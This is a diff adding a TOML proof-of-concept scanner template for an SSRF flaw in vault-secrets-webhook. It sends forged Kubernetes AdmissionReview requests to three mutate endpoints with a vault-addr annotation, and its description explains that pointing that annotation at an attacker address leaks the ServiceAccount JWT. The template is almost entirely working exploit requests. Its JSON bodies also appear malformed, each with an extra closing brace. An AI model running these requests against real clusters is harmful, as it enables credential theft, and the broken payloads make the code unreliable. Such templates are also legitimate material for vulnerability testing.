@@ -1,0 +1,95 @@
+[info]
+author = "ave"
+description = "通过向 vault-secrets-webhook 的 mutate 端点发送伪造的 AdmissionReview 请求，设置 vault.security.banzaicloud.io/vault-addr 注解指向攻击者控制的地址，触发 Webhook 向该地址发起出站 HTTP 连接并泄露 ServiceAccount JWT 令牌。检测响应中是否包含连接错误、超时等 SSRF 特征标记。"
+id = "POC-AVE-2026-0794"
+name = "CVE-2026-54725 vault-secrets-webhook SSRF PoC"
+severity = "critical"
+tags = ["ave-2026-0794"]
+vuln_id = [
+    "CVE-2026-54725",
+    "AVE-2026-0794",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mutate"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"test-uid","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"name":"probe-pod","namespace":"default","operation":"CREATE","userInfo":{"username":"system:serviceaccount:default:default","groups":["system:serviceaccounts","system:authenticated"]},"object":{"apiVersion":"v1","kind":"Pod","metadata":{"name":"probe-pod","namespace":"default","annotations":{"vault.security.banzaicloud.io/vault-addr":"http://127.0.0.1:1","vault.security.banzaicloud.io/vault-inject":"true","vault.security.banzaicloud.io/vault-role":"default","vault.security.banzaicloud.io/vault-serviceaccount":"default","vault.security.banzaicloud.io/vault-path":"kubernetes"}},"spec":{"serviceAccountName":"default","containers":[{"name":"probe","image":"alpine:3.18","command":["sh"]}]}},"dryRun":true,"options":{"apiVersion":"meta.k8s.io/v1","kind":"CreateOptions"}}}}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection refused",
+    "no such host",
+    "dial tcp",
+    "i/o timeout",
+    "vault error",
+    "invalid vault address",
+    "context deadline exceeded",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mutate-pods"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"test-uid","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"name":"probe-pod","namespace":"default","operation":"CREATE","userInfo":{"username":"system:serviceaccount:default:default","groups":["system:serviceaccounts","system:authenticated"]},"object":{"apiVersion":"v1","kind":"Pod","metadata":{"name":"probe-pod","namespace":"default","annotations":{"vault.security.banzaicloud.io/vault-addr":"http://127.0.0.1:1","vault.security.banzaicloud.io/vault-inject":"true","vault.security.banzaicloud.io/vault-role":"default","vault.security.banzaicloud.io/vault-serviceaccount":"default","vault.security.banzaicloud.io/vault-path":"kubernetes"}},"spec":{"serviceAccountName":"default","containers":[{"name":"probe","image":"alpine:3.18","command":["sh"]}]}},"dryRun":true,"options":{"apiVersion":"meta.k8s.io/v1","kind":"CreateOptions"}}}}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection refused",
+    "no such host",
+    "dial tcp",
+    "i/o timeout",
+    "vault error",
+    "invalid vault address",
+    "context deadline exceeded",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/webhook/mutate"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"test-uid","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"name":"probe-pod","namespace":"default","operation":"CREATE","userInfo":{"username":"system:serviceaccount:default:default","groups":["system:serviceaccounts","system:authenticated"]},"object":{"apiVersion":"v1","kind":"Pod","metadata":{"name":"probe-pod","namespace":"default","annotations":{"vault.security.banzaicloud.io/vault-addr":"http://127.0.0.1:1","vault.security.banzaicloud.io/vault-inject":"true","vault.security.banzaicloud.io/vault-role":"default","vault.security.banzaicloud.io/vault-serviceaccount":"default","vault.security.banzaicloud.io/vault-path":"kubernetes"}},"spec":{"serviceAccountName":"default","containers":[{"name":"probe","image":"alpine:3.18","command":["sh"]}]}},"dryRun":true,"options":{"apiVersion":"meta.k8s.io/v1","kind":"CreateOptions"}}}}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection refused",
+    "no such host",
+    "dial tcp",
+    "i/o timeout",
+    "vault error",
+    "invalid vault address",
+    "context deadline exceeded",
+]
